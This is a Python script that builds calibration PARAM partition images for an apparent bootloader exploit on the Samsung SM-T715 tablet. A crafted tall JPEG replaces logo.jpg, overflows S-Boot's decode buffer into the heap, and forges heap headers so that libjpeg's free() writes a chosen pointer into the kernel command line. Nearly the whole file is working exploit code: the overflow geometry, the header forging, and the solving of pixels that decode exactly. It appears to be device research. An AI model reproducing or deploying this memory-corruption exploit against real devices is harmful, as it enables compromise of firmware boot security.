#!/usr/bin/env python3

# SPDX-License-Identifier: MIT
# Copyright (c) 2026 elkir0

"""Build calibration PARAM images for the S-Boot logo overflow (SM-T715).

    python3 -I build_calib.py STOCK_PARAM OUT_PARAM --width W [--out-jpeg FILE] [--marker-offset N]
    python3 -I build_calib.py --plan            # which widths to try, and what they cover

The stock ``logo.jpg`` is replaced by a tall, mostly black JPEG. Its last rows overflow the
12 MiB decode buffer and the free heap block, and carry candidate 16-byte heap headers
``{size, free, prev = P, next = N}``. If the lowest libjpeg block header lies in that range,
the first ``free()`` of ``jpeg_destroy`` writes N at P+12. For the calibration P points
into S-Boot's kernel command line (0x240C36E0), so the marker N is read back from
/proc/cmdline after a normal boot.

Only 25 % of the colours survive libjpeg's integer YCbCr->RGB conversion exactly, so a
pixel made of three bytes of P cannot be written. As 16 and 3 are coprime, this happens
for two of any three consecutive 16-aligned headers; only headers with address
X = A + 2 (mod 3), A being the start of their row, are forged. The stride is kept a
multiple of 16, so every forged row is identical, and several widths are needed to
sweep a given address.
"""

from __future__ import annotations

import argparse
import hashlib
import io
import struct
import sys
from pathlib import Path

import numpy as np
from PIL import Image

sys.path.insert(0, str(Path(__file__).resolve().parent))
import jpegforge as jf  # noqa: E402  (our own module, same directory)

DECODE_BUFFER = 0x24300000
HEAP_BASE, HEAP_END = 0x24F00000, 0x25100000
HEAP_TOP_SAFE = 0x250FEAC0  # libjpeg's 1280-byte MCU buffer is expected just below the heap end
LOWEST_BLOCK_ESTIMATE = 0x250F7F40  # from a reading of libjpeg 9's allocations; to be calibrated
CMDLINE = 0x240C36E0
NEXT_REGION = (0x24, 0x30)  # N = 0x2430xxxx: an earlier, black, already decoded row
RANGE_BYTES = 256 * 1024  # the forged rows reach this far below the estimated lowest header


class Geometry:
    """Where the rows of a ``width``-wide image land, and which header addresses they forge."""

    def __init__(self, width: int, probe: bool = False) -> None:
        self.width = width
        self.probe = probe
        self.row_bytes = width * 3
        self.stride = (self.row_bytes + 3) & ~3
        self.pad = self.stride - self.row_bytes  # bytes libjpeg leaves unwritten at the end of a row
        # libjpeg writes only 3*width bytes per row. With a pad of 1 or 2 the last byte of a
        # row cuts one header per row, whose top byte stays stale: harmless unless the real
        # header sits exactly there, hence only for a very wide image (one slot in 3000).
        # Other strides leave rows misaligned or do not change which third is forged.
        if width % 16 not in (0, 5, 10) or (self.pad and width < 16000):
            raise ValueError(f"width {width}: stride {self.stride}, pad {self.pad}")
        self.last_row = (HEAP_TOP_SAFE - DECODE_BUFFER - self.row_bytes) // self.stride
        self.estimate = lowest_header_estimate(width)
        centre = (self.estimate - DECODE_BUFFER) // self.stride
        self.start = max(0, centre - RANGE_BYTES // self.stride)
        self.start -= self.start % 8  # whole 8-row blocks only
        self.height = self.last_row + 1
        self.height -= self.height % 8
        if probe:  # stop 64 KiB below the heap: nothing but the unused part of the buffer is touched
            self.height = (HEAP_BASE - DECODE_BUFFER - 65536) // self.stride
            self.height -= self.height % 8
            self.start = self.height

    def address(self, row: int) -> int:
        return DECODE_BUFFER + self.stride * row

    def row_of(self, address: int) -> int:
        return (address - DECODE_BUFFER) // self.stride

    def forged(self, address: int) -> bool:
        """Would this 16-aligned address carry a forged header?"""
        row = self.row_of(address)
        return self.start <= row < self.height and (address - self.address(row) + 8) % 3 == 1

    @staticmethod
    def widths(count: int) -> list[int]:
        found = []
        width = 1280
        while len(found) < count:
            try:
                Geometry(width)
            except ValueError:
                pass
            else:
                found.append(width)
            width += 1
        return found


def lowest_header_estimate(width: int) -> int:
    """Where the last large allocation of the decode is expected, from libjpeg 9's code.

    Allocations are carved from the top of the heap downwards: one 1280-byte MCU buffer,
    then for each of the three components one block of 8 rows (alloc_sarray). Each request
    costs its size rounded up to 16 plus ALIGN_SIZE-1 and a 12-byte pool header, and a
    16-byte header of our own.
    """
    blocks = 8 * ((width + 7) // 8 * 8)
    total = sum(16 + (need + 15) // 16 * 16 for need in (1280 + 15 + 12,) + ((blocks + 15 + 12),) * 3)
    return HEAP_END - total


def reachability() -> np.ndarray:
    y = np.arange(256, dtype=np.int64)[:, None, None]
    cr_r = np.array(jf.CR_R, dtype=np.int64)[None, None, :]
    cb_b = np.array(jf.CB_B, dtype=np.int64)[None, :, None]
    cb_g = np.array(jf.CB_G, dtype=np.int64)[None, :, None]
    cr_g = np.array(jf.CR_G, dtype=np.int64)[None, None, :]
    r = np.clip(y + cr_r, 0, 255)
    g = np.clip(y + ((cb_g + cr_g) >> 16), 0, 255)
    b = np.clip(y + cb_b, 0, 255)
    reach = np.zeros((256, 256, 256), dtype=bool)
    reach[r, g, b] = True
    return reach


def find_header_pointers(reach: np.ndarray, prev: int) -> tuple[int, int] | None:
    """Two addresses in the black part of the decode buffer whose bytes a header can carry.

    ``safe`` goes into the headers free() must leave alone: the byte it tests at safe+4 is
    zero. ``nxt`` goes into the forged headers; its bytes are the marker read back from the
    command line, so they are printable and never zero.
    """
    p = struct.pack("<I", prev)
    if not reach[0x24, 0, 0]:
        return None
    safe = nxt = None
    for high in range(0x30, 0xE7):
        for mid in range(256):
            for low in range(256):
                if safe is None and reach[low, mid, high] and reach[mid, high, 0x24]:
                    safe = low | mid << 8 | high << 16 | 0x24 << 24
                if nxt is None and 0x21 <= low <= 0x7E and 0x21 <= mid <= 0x7E and 0x21 <= high <= 0x7E \
                        and reach[p[2], p[3], low] and reach[mid, high, 0x24]:
                    nxt = low | mid << 8 | high << 16 | 0x24 << 24
                if safe is not None and nxt is not None:
                    return safe, nxt
    return None


def solve_row(reach: np.ndarray, row_bytes: int, prev: int, safe: int, nxt: int):
    """One forged row, exactly decodable: a header in every 16-byte slot.

    A slot whose pointer bytes would fall three in one pixel gets ``safe`` in both pointer
    fields: a header that free() leaves alone. The other slots (one in three) are forged.
    Returns the row, the (Y, Cb, Cr) of its pixels, and the end of the last complete slot:
    what follows it is only padding, so the last block columns get a type of their own.
    """
    row: list[int | None] = [None] * row_bytes
    prev_bytes = struct.pack("<I", prev)
    safe_bytes = struct.pack("<I", safe)
    nxt_bytes = struct.pack("<I", nxt)
    candidates = 0
    base = 0
    while base + 20 <= row_bytes:  # the header and libjpeg's next pointer must both be written
        forged = (base + 8) % 3 == 1  # no pixel of this slot holds three bytes of prev
        row[base + 1:base + 4] = [0, 0, 0]
        row[base + 8:base + 12] = list(prev_bytes if forged else safe_bytes)
        row[base + 12:base + 16] = list(nxt_bytes if forged else safe_bytes)
        candidates += forged
        base += 16
    if base < row_bytes:  # the slot a pad byte cuts: fill what this row writes
        row[base + 1:base + 4] = [0, 0, 0]
        row[base + 8:base + 12] = list(safe_bytes)
        forged = (base + 8) % 3 == 1
        row[base + 12:min(base + 16, row_bytes)] = list(nxt_bytes if forged else safe_bytes)[:max(0, min(16, row_bytes - base) - 12)]
    yccs: list[tuple[int, int, int]] = []
    for j in range(row_bytes // 3):
        cells = row[3 * j:3 * j + 3]
        free = [i for i, v in enumerate(cells) if v is None]
        found = None
        for values in np.ndindex(*(256,) * len(free)):
            rgb = [cells[i] if cells[i] is not None else int(values[free.index(i)]) for i in range(3)]
            if reach[rgb[0], rgb[1], rgb[2]]:
                ycc = jf.find_ycc((rgb[0], rgb[1], rgb[2]))
                if ycc is not None:
                    found = (rgb, ycc)
                    break
        if found is None:
            return None
        row[3 * j:3 * j + 3], ycc = found
        yccs.append(ycc)
    print(f"  per row: {candidates} forged headers among {(base // 16)} slots, "
          f"all {len(yccs)} pixels exact")
    return bytes(row), yccs, base - 16 + 20  # type: ignore[arg-type]


def build_jpeg(geometry: Geometry, row: bytes, yccs: list[tuple[int, int, int]], last_slot_end: int) -> bytes:
    """The forged rows are all alike. A block column is typed by its place in the 16-pixel
    period, except the last ones, which reach past the last complete header into padding."""
    types: dict[tuple, list] = {}

    def solve(key, columns: list[tuple[int, int, int]]) -> None:
        solved = []
        for component in range(3):
            samples = tuple(px[component] for _ in range(8) for px in columns)
            coefs = jf.solve_block2d(samples)
            assert coefs is not None, (key, component)
            solved.append(list(coefs))
        types[key] = solved

    def column_type(bx: int) -> list:
        if 24 * bx + 24 <= last_slot_end:
            key = ("period", bx % 2)
            if key not in types:
                solve(key, yccs[8 * (bx % 2):8 * (bx % 2) + 8])
        else:
            key = ("tail", bx)
            if key not in types:
                # pixels past the end of the row are decoded but never written: keep them black
                pixels = [tuple(row[24 * bx + 3 * x + c] for c in range(3)) if 24 * bx + 3 * x + 3 <= len(row)
                          else (0, 128, 128) for x in range(8)]
                found = [jf.find_ycc(p) for p in pixels]
                assert all(found), "a padding pixel is not exactly representable"
                solve(key, found)  # type: ignore[arg-type]
        return types[key]

    columns = [column_type(bx) for bx in range((geometry.width + 7) // 8)]  # the last block may be cut
    blocks = {(by, bx): columns[bx]
              for by in range(geometry.start // 8, geometry.height // 8) for bx in range(len(columns))}
    return jf.encode_jpeg(geometry.width, geometry.height, blocks)


def verify(jpeg: bytes, geometry: Geometry, row: bytes) -> list[str]:
    """Decode with Pillow and compare every row of the forged bands with its model."""
    problems = []
    with Image.open(io.BytesIO(jpeg)) as image:
        image.load()
        raw = image.tobytes()
    n = geometry.row_bytes
    for r in range(geometry.start, geometry.height):
        got = raw[r * n:(r + 1) * n]
        if got != row:
            first = next(i for i in range(n) if got[i] != row[i])
            problems.append(f"row {r}: first difference at byte {first}")
    for r in (0, 2047, 3200, geometry.start - 1):
        if r >= 0 and raw[r * n:(r + 1) * n].strip(b"\0"):
            problems.append(f"row {r} is not black")
    return problems


def replace_logo(stock: bytes, logo: bytes) -> bytes:
    """The stock tar with logo.jpg replaced; every other header is kept byte for byte."""
    out = bytearray()
    offset = 0
    replaced = False
    while offset + 512 <= len(stock) and stock[offset] != 0:
        header = bytearray(stock[offset:offset + 512])
        name = bytes(header[:100]).split(b"\0")[0]
        size = int(bytes(header[124:136]).split(b"\0")[0].strip() or b"0", 8)
        data = stock[offset + 512:offset + 512 + size]
        if name == b"logo.jpg":
            header[124:136] = b"%011o\0" % len(logo)
            header[148:156] = b"        "
            header[148:156] = b"%06o\0 " % (sum(header) & 0o7777777)
            data, replaced = logo, True
        out += header
        out += data + bytes(-len(data) % 512)
        offset += 512 + (size + 511) // 512 * 512
    assert replaced and len(out) + 1024 <= len(stock), "stock PARAM layout unexpected"
    out += bytes(len(stock) - len(out))
    return bytes(out)


def plan() -> int:
    """Greedy choice of widths covering the 16-aligned addresses around the estimate."""
    low = LOWEST_BLOCK_ESTIMATE - 64 * 1024
    high = LOWEST_BLOCK_ESTIMATE + 32 * 1024
    targets = set(range(low & ~0xFFF, high, 16))
    left = set(targets)
    order = []
    for width in Geometry.widths(40):
        geometry = Geometry(width)
        gain = {x for x in left if geometry.forged(x)}
        if len(gain) * 16 < 2 * 1024:
            continue
        order.append(width)
        left -= gain
        print(f"width {width:4d} (stride {geometry.stride}, rows {geometry.start}..{geometry.height - 1}): "
              f"+{len(gain)} headers, {100 * (len(targets) - len(left)) // len(targets)} % covered, "
              f"forges the estimate: {geometry.forged(LOWEST_BLOCK_ESTIMATE)}")
        if not left:
            break
    print("widths, in order:", order)
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--plan", action="store_true")
    parser.add_argument("stock_param", type=Path, nargs="?")
    parser.add_argument("out_param", type=Path, nargs="?")
    parser.add_argument("--out-jpeg", type=Path)
    parser.add_argument("--probe", action="store_true", help="a black image that stops below the heap")
    parser.add_argument("--width", type=int, required=False)
    parser.add_argument("--marker-offset", type=int, default=496, help="byte offset of the marker in the command line")
    args = parser.parse_args()
    if args.plan:
        return plan()
    if not (args.stock_param and args.out_param) or not (args.probe or args.width):
        parser.error("need STOCK_PARAM OUT_PARAM and --width (or --plan, or --probe)")

    geometry = Geometry(args.width or 1312, probe=args.probe)
    low, high = geometry.address(geometry.start), geometry.address(geometry.height - 1) + geometry.row_bytes
    print(f"width {geometry.width}, stride {geometry.stride}, pad {geometry.pad}, {geometry.height} rows; "
          f"heap {HEAP_BASE:#010x}-{HEAP_END:#010x}")
    if args.probe:
        print(f"probe: {geometry.height} black rows write {low:#010x}..{high:#010x}, "
              f"which stops {'below' if high < HEAP_BASE else 'ABOVE'} the heap")
        jpeg = jf.encode_jpeg(geometry.width, geometry.height, {})
        with Image.open(io.BytesIO(jpeg)) as image:
            image.load()
            assert not image.tobytes().strip(b"\0"), "probe image is not black"
        param = replace_logo(args.stock_param.read_bytes(), jpeg)
        args.out_param.write_bytes(param)
        print(f"jpeg: {len(jpeg)} bytes; {args.out_param}: {len(param)} bytes, sha256 {hashlib.sha256(param).hexdigest()}")
        return 0
    print(f"rows {geometry.start}..{geometry.height - 1} write {low:#010x}..{high:#010x} "
          f"({(high - low) // 1024} KiB); heap top left alone: {high <= HEAP_TOP_SAFE}")
    print(f"estimated lowest header {geometry.estimate:#010x} is forged by this image: "
          f"{geometry.forged(geometry.estimate)}")
    prev = CMDLINE + args.marker_offset - 12
    print(f"marker at command line offset {args.marker_offset}: prev {prev:#010x}, next in {NEXT_REGION[0]:#02x}{NEXT_REGION[1]:02x}xxxx")

    reach = reachability()
    pointers = find_header_pointers(reach, prev)
    if pointers is None:
        print("FAIL: no pair of safe and marker pointers for this prev")
        return 1
    safe, nxt = pointers
    print(f"safe pointer {safe:#010x} (untouched slots), marker pointer {nxt:#010x} "
          f"-> command line bytes {struct.pack('<I', nxt)!r}")
    solved = solve_row(reach, geometry.row_bytes, prev, safe, nxt)
    if solved is None:
        print(f"FAIL: with prev {prev:#010x} some pixel of a forged row is not exactly decodable; "
              "move the marker (--marker-offset)")
        return 1
    row, yccs, last_slot_end = solved
    print("building the image")
    jpeg = build_jpeg(geometry, row, yccs, last_slot_end)
    print(f"jpeg: {len(jpeg)} bytes, sha256 {hashlib.sha256(jpeg).hexdigest()[:16]}; "
          f"fits the 1 MiB file buffer: {len(jpeg) < 0x100000}")
    problems = verify(jpeg, geometry, row)
    for problem in problems[:10]:
        print("PROBLEM:", problem)
    if problems:
        print(f"FAIL: {len(problems)} row(s) differ after decoding")
        return 1
    print(f"OK: all {geometry.height - geometry.start} forged rows decode exactly")

    param = replace_logo(args.stock_param.read_bytes(), jpeg)
    args.out_param.write_bytes(param)
    print(f"{args.out_param}: {len(param)} bytes, sha256 {hashlib.sha256(param).hexdigest()}")
    if args.out_jpeg:
        args.out_jpeg.write_bytes(jpeg)
    return 0


if __name__ == "__main__":
    sys.exit(main())
